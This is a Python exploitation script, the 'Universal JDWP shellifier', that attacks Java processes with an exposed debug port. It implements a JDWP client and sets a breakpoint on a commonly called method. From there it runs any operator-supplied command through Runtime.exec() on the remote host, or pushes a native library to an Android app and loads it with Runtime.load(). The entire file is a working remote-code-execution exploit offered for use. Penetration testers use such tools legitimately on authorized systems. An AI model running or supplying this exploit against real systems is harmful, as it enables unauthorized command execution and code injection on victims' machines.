#!/usr/bin/python
################################################################################
#
# Universal JDWP shellifier
#
# @_hugsy_
#
# And special cheers to @lanjelot
#
# loadlib option by @ikoz
#

from pathlib import Path
from subprocess import run
import socket
import time
import sys
import struct
import urllib.request, urllib.parse, urllib.error
import argparse
import traceback


################################################################################
#
# JDWP protocol variables
#
HANDSHAKE                 = b"JDWP-Handshake"

REQUEST_PACKET_TYPE       = 0x00
REPLY_PACKET_TYPE         = 0x80

# Command signatures
VERSION_SIG               = (1, 1)
CLASSESBYSIGNATURE_SIG    = (1, 2)
ALLCLASSES_SIG            = (1, 3)
ALLTHREADS_SIG            = (1, 4)
IDSIZES_SIG               = (1, 7)
CREATESTRING_SIG          = (1, 11)
SUSPENDVM_SIG             = (1, 8)
RESUMEVM_SIG              = (1, 9)
SIGNATURE_SIG             = (2, 1)
FIELDS_SIG                = (2, 4)
METHODS_SIG               = (2, 5)
GETVALUES_SIG             = (2, 6)
CLASSOBJECT_SIG           = (2, 11)
INVOKESTATICMETHOD_SIG    = (3, 3)
REFERENCETYPE_SIG         = (9, 1)
INVOKEMETHOD_SIG          = (9, 6)
STRINGVALUE_SIG           = (10, 1)
THREADNAME_SIG            = (11, 1)
THREADSUSPEND_SIG         = (11, 2)
THREADRESUME_SIG          = (11, 3)
THREADSTATUS_SIG          = (11, 4)
EVENTSET_SIG              = (15, 1)
EVENTCLEAR_SIG            = (15, 2)
EVENTCLEARALL_SIG         = (15, 3)

# Other codes
MODKIND_COUNT             = 1
MODKIND_THREADONLY        = 2
MODKIND_CLASSMATCH        = 5
MODKIND_LOCATIONONLY      = 7
EVENT_BREAKPOINT          = 2
SUSPEND_EVENTTHREAD       = 1
SUSPEND_ALL               = 2
NOT_IMPLEMENTED           = 99
VM_DEAD                   = 112
INVOKE_SINGLE_THREADED    = 2
TAG_OBJECT                = 76
TAG_STRING                = 115
TYPE_CLASS                = 1


################################################################################
#
# JDWP client class
#
class JDWPClient:

    def __init__(self, host, port=8000):
        self.host = host
        self.port = port
        self.methods = {}
        self.fields = {}
        self.id = 0x01
        return

    def create_packet(self, cmdsig, data=b""):
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        pkt = struct.pack(">IIBBB", pktlen, self.id, flags, cmdset, cmd)
        pkt+= data
        self.id += 2
        return pkt

    def read_reply(self):
        header = self.socket.recv(11)
        pktlen, id, flags, errcode = struct.unpack(">IIBH", header)

        if flags == struct.pack(">B", REPLY_PACKET_TYPE):
            if errcode :
                raise Exception("Received errcode %d" % errcode)

        buf = b""
        while len(buf) + 11 < pktlen:
            data = self.socket.recv(1024)
            if len(data):
                buf += data
            else:
                time.sleep(1)
        return buf

    def parse_entries(self, buf, formats, explicit=True):
        entries = []
        index = 0


        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1

        for i in range(nb_entries):
            data = {}
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = int(struct.unpack(">Q",buf[index:index+8]) [0])
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = int(struct.unpack(">I", buf[index:index+4])[0])
                    index += 4
                elif fmt == 'S':
                    l = struct.unpack(">I", buf[index:index+4])[0]
                    data[name] = buf[index+4:index+4+l]
                    index += 4+l
                elif fmt == 'C':
                    data[name] = buf[index]
                    index += 1
                elif fmt == 'Z':
                    t = buf[index]
                    if t == 115:
                        s = self.solve_string(buf[index+1:index+9])
                        data[name] = s
                        index+=9
                    elif t == 73:
                        data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                        buf = struct.unpack(">I", buf[index+5:index+9])
                        index=0

                else:
                    print("Error")
                    sys.exit(1)

            entries.append( data )

        return entries

    def format(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)

        raise Exception("Unknown format")

    def unformat(self, fmt, value):
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", value[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", value[:4])[0]
        else:
            raise Exception("Unknown format")
        return

    def start(self):
        self.handshake(self.host, self.port)
        self.idsizes()
        self.getversion()
        self.allclasses()
        return

    def handshake(self, host, port):
        s = socket.socket()
        try:
            s.connect( (host, port) )
        except socket.error as msg:
            raise Exception("Failed to connect: %s" % msg)

        s.send( HANDSHAKE )

        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
            raise Exception("Failed to handshake")
        else:
            self.socket = s

        return

    def leave(self):
        self.socket.close()
        return

    def getversion(self):
        self.socket.sendall( self.create_packet(VERSION_SIG) )
        buf = self.read_reply()
        formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                    ('S', "vmVersion"), ('S', "vmName"), ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.items():
                setattr(self, name, value)
        return

    @property
    def version(self):
        return "%s - %s" % (self.vmName, self.vmVersion)

    def idsizes(self):
        self.socket.sendall( self.create_packet(IDSIZES_SIG) )
        buf = self.read_reply()
        formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.items():
                setattr(self, name, value)
        return

    def allthreads(self):
        try:
            getattr(self, "threads")
        except :
            self.socket.sendall( self.create_packet(ALLTHREADS_SIG) )
            buf = self.read_reply()
            formats = [ (self.objectIDSize, "threadId")]
            self.threads = self.parse_entries(buf, formats)
        finally:
            return self.threads

    def get_thread_by_name(self, name):
        if isinstance(name, str):
            name = name.encode("utf8")

        self.allthreads()
        for t in self.threads:
            threadId = self.format(self.objectIDSize, t["threadId"])
            self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
            buf = self.read_reply()
            if len(buf) and name == self.readstring(buf):
                return t
        return None

    def allclasses(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
            buf = self.read_reply()
            formats = [ ('C', "refTypeTag"),
                        (self.referenceTypeIDSize, "refTypeId"),
                        ('S', "signature"),
                        ('I', "status")]
            self.classes = self.parse_entries(buf, formats)

        return self.classes

    def get_class_by_name(self, name):
        if isinstance(name, str):
            name = name.encode("utf8")

        for entry in self.classes:
            if entry["signature"].lower() == name.lower() :
                return entry
        return None

    def get_methods(self, refTypeId):
        if refTypeId not in self.methods:
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall( self.create_packet(METHODS_SIG, data=refId) )
            buf = self.read_reply()
            formats = [ (self.methodIDSize, "methodId"),
                        ('S', "name"),
                        ('S', "signature"),
                        ('I', "modBits")]
            self.methods[refTypeId] = self.parse_entries(buf, formats)
        return self.methods[refTypeId]

    def get_method_by_name(self, name):
        if isinstance(name, str):
            name = name.encode("utf8")

        for refId in list(self.methods.keys()):
            for entry in self.methods[refId]:
                if entry["name"].lower() == name.lower() :
                    return entry
        return None

    def getfields(self, refTypeId):
        if refTypeId not in self.fields:
            refId = self.format(self.referenceTypeIDSize, refTypeId)
            self.socket.sendall( self.create_packet(FIELDS_SIG, data=refId) )
            buf = self.read_reply()
            formats = [ (self.fieldIDSize, "fieldId"),
                        ('S', "name"),
                        ('S', "signature"),
                        ('I', "modbits")]
            self.fields[refTypeId] = self.parse_entries(buf, formats)
        return self.fields[refTypeId]

    def getvalue(self, refTypeId, fieldId):
        data = self.format(self.referenceTypeIDSize, refTypeId)
        data+= struct.pack(">I", 1)
        data+= self.format(self.fieldIDSize, fieldId)
        self.socket.sendall( self.create_packet(GETVALUES_SIG, data=data) )
        buf = self.read_reply()
        formats = [ ("Z", "value") ]
        field = self.parse_entries(buf, formats)[0]
        return field

    def createstring(self, data: bytes):
        if isinstance(data, str):
            data = data.encode("utf8")

        buf = self.buildstring(data)
        self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
        buf = self.read_reply()
        
        return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)

    def buildstring(self, data: bytes):
        return struct.pack(">I", len(data)) + data

    def readstring(self, data):
        size = struct.unpack(">I", data[:4])[0]
        return data[4:4+size]

    def suspendvm(self):
        self.socket.sendall( self.create_packet( SUSPENDVM_SIG ) )
        self.read_reply()
        return

    def resumevm(self):
        self.socket.sendall( self.create_packet( RESUMEVM_SIG ) )
        self.read_reply()
        return

    def invokestatic(self, classId, threadId, methId, *args):
        data = self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) )
        buf = self.read_reply()
        return buf

    def invoke(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
        buf = self.read_reply()
        return buf

    def invokeVoid(self, objId, threadId, classId, methId, *args):
        data = self.format(self.objectIDSize, objId)
        data+= self.format(self.objectIDSize, threadId)
        data+= self.format(self.referenceTypeIDSize, classId)
        data+= self.format(self.methodIDSize, methId)
        data+= struct.pack(">I", len(args))
        for arg in args:
            data+= arg
        data+= struct.pack(">I", 0)

        self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
        buf = None
        return buf

    def solve_string(self, objId):
        self.socket.sendall( self.create_packet(STRINGVALUE_SIG, data=objId) )
        buf = self.read_reply()
        if len(buf):
            return self.readstring(buf)
        else:
            return b""

    def query_thread(self, threadId, kind):
        data = self.format(self.objectIDSize, threadId)
        self.socket.sendall( self.create_packet(kind, data=data) )
        buf = self.read_reply()
        return

    def suspend_thread(self, threadId):
        return self.query_thread(threadId, THREADSUSPEND_SIG)

    def status_thread(self, threadId):
        return self.query_thread(threadId, THREADSTATUS_SIG)

    def resume_thread(self, threadId):
        return self.query_thread(threadId, THREADRESUME_SIG)

    def send_event(self, eventCode, *args):
        data = b""
        data+= struct.pack(">B", eventCode )
        data+= struct.pack(">B", SUSPEND_ALL )
        data+= struct.pack(">I", len(args))

        for kind, option in args:
            data+= struct.pack(">B", kind )
            data+= option

        self.socket.sendall( self.create_packet(EVENTSET_SIG, data=data) )
        buf = self.read_reply()
        return struct.unpack(">I", buf)[0]

    def clear_event(self, eventCode, rId):
        data = struct.pack(">B", eventCode)
        data+= struct.pack(">I", rId)
        self.socket.sendall( self.create_packet(EVENTCLEAR_SIG, data=data) )
        self.read_reply()
        return

    def clear_events(self):
        self.socket.sendall( self.create_packet(EVENTCLEARALL_SIG) )
        self.read_reply()
        return

    def wait_for_event(self):
        buf = self.read_reply()
        return buf

    def parse_event_breakpoint(self, buf, eventId):
        num = struct.unpack(">I", buf[2:6])[0]
        rId = struct.unpack(">I", buf[6:10])[0]
        if rId != eventId:
            return None
        tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
        loc = -1 # don't care
        return rId, tId, loc



def runtime_exec(jdwp, args):
    print(("[+] Targeting '%s:%d'" % (args.target, args.port)))
    print(("[+] Reading settings for '%s'" % jdwp.version))

    # 1. get Runtime class reference
    runtimeClass = jdwp.get_class_by_name(b"Ljava/lang/Runtime;")
    if runtimeClass is None:
        print ("[-] Cannot find class Runtime")
        return False
    print(("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"]))

    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass["refTypeId"])
    getRuntimeMeth = jdwp.get_method_by_name(b"getRuntime")
    if getRuntimeMeth is None:
        print ("[-] Cannot find method Runtime.getRuntime()")
        return False
    print(("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"]))

    # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name( args.break_on_class )
    if c is None:
        print(("[-] Could not access class '%s'" % args.break_on_class))
        print("[-] It is possible that this class is not used by application")
        print("[-] Test with another one with option `--break-on`")
        return False

    jdwp.get_methods( c["refTypeId"] )
    m = jdwp.get_method_by_name( args.break_on_method )
    if m is None:
        print(("[-] Could not access method '%s'" % args.break_on))
        return False

    loc = struct.pack(">B", TYPE_CLASS )
    loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
    loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
    loc+= struct.pack(">II", 0, 0)
    data = [ (MODKIND_LOCATIONONLY, loc), ]
    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
    print(("[+] Created break event id=%x" % rId))

    # 4. resume vm and wait for event
    jdwp.resumevm()

    print(("[+] Waiting for an event on '%s'" % args.break_on))
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break

    rId, tId, loc = ret
    print(("[+] Received matching event from thread %#x" % tId))

	# time.sleep(1)
    # jdwp.clear_event(EVENT_BREAKPOINT, rId)

    # 5. Now we can execute any code
    if args.cmd:
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
    elif args.loadlib:
        packagename = getPackageName(jdwp, tId)
        print(f"{packagename = }")

        tmpLocation = "/data/local/tmp/" + Path(args.loadlib).name
        print("Pushing to device")
        run(["adb", "push", args.loadlib, tmpLocation], check=True)

        dstLocation = "/data/data/" + packagename + "/" + Path(args.loadlib).name
        command = "cp " + tmpLocation + " " + dstLocation
        print("[*] Copying library from " + tmpLocation + " to " + dstLocation)
        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command)
        time.sleep(2)
        print("[*] Executing Runtime.load(" + dstLocation + ")")
        runtime_load_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], dstLocation)
        time.sleep(2)
        print("[*] Library should now be loaded")
    else:
        # by default, only prints out few system properties
        runtime_exec_info(jdwp, tId)

    jdwp.resumevm()

    print ("[!] Command successfully executed")

    return True


def runtime_exec_info(jdwp, threadId):
    #
    # This function calls java.lang.System.getProperties() and
    # displays OS properties (non-intrusive)
    #
    properties = {b"java.version": "Java Runtime Environment version",
                  b"java.vendor": "Java Runtime Environment vendor",
                  b"java.vendor.url": "Java vendor URL",
                  b"java.home": "Java installation directory",
                  b"java.vm.specification.version": "Java Virtual Machine specification version",
                  b"java.vm.specification.vendor": "Java Virtual Machine specification vendor",
                  b"java.vm.specification.name": "Java Virtual Machine specification name",
                  b"java.vm.version": "Java Virtual Machine implementation version",
                  b"java.vm.vendor": "Java Virtual Machine implementation vendor",
                  b"java.vm.name": "Java Virtual Machine implementation name",
                  b"java.specification.version": "Java Runtime Environment specification version",
                  b"java.specification.vendor": "Java Runtime Environment specification vendor",
                  b"java.specification.name": "Java Runtime Environment specification name",
                  b"java.class.version": "Java class format version number",
                  b"java.class.path": "Java class path",
                  b"java.library.path": "List of paths to search when loading libraries",
                  b"java.io.tmpdir": "Default temp file path",
                  b"java.compiler": "Name of JIT compiler to use",
                  b"java.ext.dirs": "Path of extension directory or directories",
                  b"os.name": "Operating system name",
                  b"os.arch": "Operating system architecture",
                  b"os.version": "Operating system version",
                  b"file.separator": "File separator",
                  b"path.separator": "Path separator",
                  b"user.name": "User's account name",
                  b"user.home": "User's home directory",
                  b"user.dir": "User's current working directory"
                }

    systemClass = jdwp.get_class_by_name(b"Ljava/lang/System;")
    if systemClass is None:
        print ("[-] Cannot find class java.lang.System")
        return False

    jdwp.get_methods(systemClass["refTypeId"])
    getPropertyMeth = jdwp.get_method_by_name(b"getProperty")
    if getPropertyMeth is None:
        print ("[-] Cannot find method System.getProperty()")
        return False

    for propStr, propDesc in properties.items():
        propObjIds =  jdwp.createstring(propStr)
        if len(propObjIds) == 0:
            print ("[-] Failed to allocate command")
            return False
        propObjId = propObjIds[0]["objId"]

        data = [ struct.pack(">B", TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, propObjId), ]
        buf = jdwp.invokestatic(systemClass["refTypeId"],
                                threadId,
                                getPropertyMeth["methodId"],
                                *data)
        if buf[0] != TAG_STRING:
            print(("[-] %s: Unexpected returned type: expecting String" % propStr))
        else:
            retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
            res = cli.solve_string(jdwp.format(jdwp.objectIDSize, retId))
            print(("[+] Found %s '%s'" % (propDesc, res)))

    return True


def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
    #
    # This function will invoke command as a payload, which will be running
    # with JVM privilege on host (intrusive).
    #
    print(("[+] Selected payload '%s'" % command))

    # 1. allocating string containing our command to exec()
    cmdObjIds = jdwp.createstring( command )
    if len(cmdObjIds) == 0:
        print ("[-] Failed to allocate command")
        return False
    cmdObjId = cmdObjIds[0]["objId"]
    print(("[+] Command string object created id:%x" % cmdObjId))

    # 2. use context to get Runtime object
    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
    if buf[0] != TAG_OBJECT:
        print ("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])

    if rt is None:
        print("[-] Failed to invoke Runtime.getRuntime()")
        return False
    print(("[+] Runtime.getRuntime() returned context id:%#x" % rt))

    # 3. find exec() method
    execMeth = jdwp.get_method_by_name(b"exec")
    if execMeth is None:
        print ("[-] Cannot find method Runtime.exec()")
        return False
    print(("[+] found Runtime.exec(): id=%x" % execMeth["methodId"]))

    # 4. call exec() in this context with the alloc-ed string
    data = [ struct.pack(">B", TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
    buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
    if buf[0] != TAG_OBJECT:
        print ("[-] Unexpected returned type: expecting Object")
        return False

    retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
    print(("[+] Runtime.exec() successful, retId=%x" % retId))

    return True

def getPackageName(jdwp, threadId):
    #
    # This function will invoke ActivityThread.currentApplication().getPackageName()
    #
    activityThreadClass = jdwp.get_class_by_name("Landroid/app/ActivityThread;")
    if activityThreadClass is None:
        print("[-] Cannot find class android.app.ActivityThread")
        return None

    contextWrapperClass = jdwp.get_class_by_name("Landroid/content/ContextWrapper;")
    if contextWrapperClass is None:
        print("[-] Cannot find class android.content.ContextWrapper")
        return None

    jdwp.get_methods(activityThreadClass["refTypeId"])
    jdwp.get_methods(contextWrapperClass["refTypeId"])

    getContextMeth = jdwp.get_method_by_name("currentApplication")
    if getContextMeth is None:
        print("[-] Cannot find method ActivityThread.currentApplication()")
        return None

    buf = jdwp.invokestatic(
        activityThreadClass["refTypeId"], threadId, getContextMeth["methodId"])
    if buf[0] != TAG_OBJECT:
        print("[-] Unexpected returned type: expecting Object")
        return None
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
    if rt is None:
        print("[-] Failed to invoke ActivityThread.currentApplication()")
        return None

    # 3. find getPackageName() method
    getPackageNameMeth = jdwp.get_method_by_name("getPackageName")
    if getPackageNameMeth is None:
        print("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
        return None

    # 4. call getPackageNameMeth()
    buf = jdwp.invoke(rt, threadId, contextWrapperClass["refTypeId"], getPackageNameMeth["methodId"])
    if buf[0] != TAG_STRING:
        print("[-] %s: Unexpected returned type: expecting String" % propStr)
    else:
        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
        res = cli.solve_string(jdwp.format(jdwp.objectIDSize, retId))
        print("[+] getPackageMethod(): '%s'" % (res))

    return res.decode("utf8")


def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, library):
    #
    # This function will run Runtime.load() with library as a payload
    #

    # print("[+] Selected payload '%s'" % library)

    # 1. allocating string containing our command to exec()
    cmdObjIds = jdwp.createstring( library )
    if len(cmdObjIds) == 0:
        print("[-] Failed to allocate library string")
        return False
    cmdObjId = cmdObjIds[0]["objId"]
    # print("[+] Command string object created id:%x" % cmdObjId)

    # 2. use context to get Runtime object
    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
    if buf[0] != TAG_OBJECT:
        print("[-] Unexpected returned type: expecting Object")
        return False
    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])

    if rt is None:
        print("[-] Failed to invoke Runtime.getRuntime()")
        return False
    # print("[+] Runtime.getRuntime() returned context id:%#x" % rt)

    # 3. find load() method
    loadMeth = jdwp.get_method_by_name("load")
    if loadMeth is None:
        print("[-] Cannot find method Runtime.load()")
        return False
    # print("[+] found Runtime.load(): id=%x" % loadMeth["methodId"])

    # 4. call exec() in this context with the alloc-ed string
    data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
    jdwp.invokeVoid(rt, threadId, runtimeClassId, loadMeth["methodId"], *data)

    print("[+] Runtime.load(%s) probably successful" % library)

    return True


def str2fqclass(s):
    i = s.rfind(b'.')
    if i == -1:
        print("Cannot parse path")
        sys.exit(1)

    method = s[i:][1:]
    classname = b'L' + s[:i].replace(b'.', b'/') + b';'
    return classname, method


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter )

    parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
    parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")

    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                        default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                        help="Specify command to execute remotely")
    parser.add_argument("--loadlib", dest="loadlib", type=str, metavar="LIBRARYNAME",
                        help="Specify library to inject into process load")

    args = parser.parse_args()

    classname, meth = str2fqclass(args.break_on.encode('utf8','ignore'))
    setattr(args, "break_on_class", classname)
    setattr(args, "break_on_method", meth)

    retcode = 0

    try:
        cli = JDWPClient(args.target, args.port)
        cli.start()

        if runtime_exec(cli, args) == False:
            print ("[-] Exploit failed")
            retcode = 1

    except KeyboardInterrupt:
        print ("[+] Exiting on user's request")

    except Exception as e:
        print(("[-] Exception: %s" % e))
        traceback.print_exc()
        retcode = 1
        cli = None

    finally:
        if cli:
            cli.leave()

    sys.exit(retcode)
